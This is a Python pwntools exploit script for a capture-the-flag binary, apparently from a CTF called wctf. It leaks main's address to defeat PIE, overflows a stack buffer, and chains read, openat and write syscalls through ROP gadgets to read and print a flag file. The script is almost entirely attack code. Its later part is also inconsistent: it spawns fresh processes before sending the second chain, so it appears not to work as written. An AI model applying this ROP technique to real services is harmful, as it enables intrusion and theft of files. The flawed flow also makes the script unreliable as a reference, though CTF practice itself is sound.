from pwn import *

#pr = remote('drywall.kctf-453514-codelab.kctf.cloud', 1337) 
pr = process('./chal')

elf = context.binary = ELF('./chal', checksec=False)
context.binary = elf

#pr = elf.process()
#pr = elf.debug(gdbscript="b main")

pr.recvuntil(b'H4x0r?\n')
pr.sendline("blablabla")
pr.recvuntil(b" <|;)\n")

main_addr = int(pr.recvline().strip(),16)
log.info(f"main addr: {hex(main_addr)}")

main_offset = elf.sym.main
log.info(f"main offset: {hex(main_offset)}")

base_addr = main_addr - main_offset
log.info(f"base addr: {hex(base_addr)}")

FLAG = b"/home/user/flag.txt\x00"
FLAG_SIZE = 48
w_section =  base_addr + 0x4200
log.info(f"w_section: {hex(w_section)}")


rop = ROP(elf)
rop.raw(b"A" * 0x118)

# read(0, w_section, 128)
rop.rdi = 0
rop.rsi = w_section
rop.rdx = 128
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# openat(-1, w_section, O_RDONLY) => 3
rop.rdi = -1
rop.rsi = w_section
rop.rdx = 0
rop.rax = constants.SYS_openat
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.raw(rop.find_gadget(['ret'])[0]) # stack align
rop.raw(p64(elf.sym["main"]))

pr.sendline(rop.chain())
pr.sendline(FLAG)

pr = elf.process()
pr = elf.debug(gdbscript="b main")

print('rdi', hex(rop.rdi))
print('rsi', hex(rop.rsi))
print('rdx', hex(rop.rdx))
print('rax', hex(rop.rax))
print('syscall', hex(rop.find_gadget(['syscall', 'ret'])[0]))
print('ret', hex(rop.find_gadget(['ret'])[0]))
print('main', hex(elf.sym["main"]))
print('base', hex(elf.address))
print('w_section', hex(w_section))
print('padding', 0x118)


pr.sendlineafter(b"H4x0r?\n", b"smiley")
pr.readuntil(b";)\n")

rop = ROP(elf)
rop.raw(b"A" * 0x118)

# read(3, w_section, FLAG_SIZE)
rop.rdi = 3
rop.rsi = w_section
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# write(stdout, w_section, FLAG_SIZE)
rop.rdi = 1
rop.rsi = w_section
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

pr.sendline(rop.chain())


pr = elf.process()
pr = elf.debug(gdbscript="b main")

pr.readuntil(b"wctf{")
print("wctf{" + pr.readuntil(b"}").decode())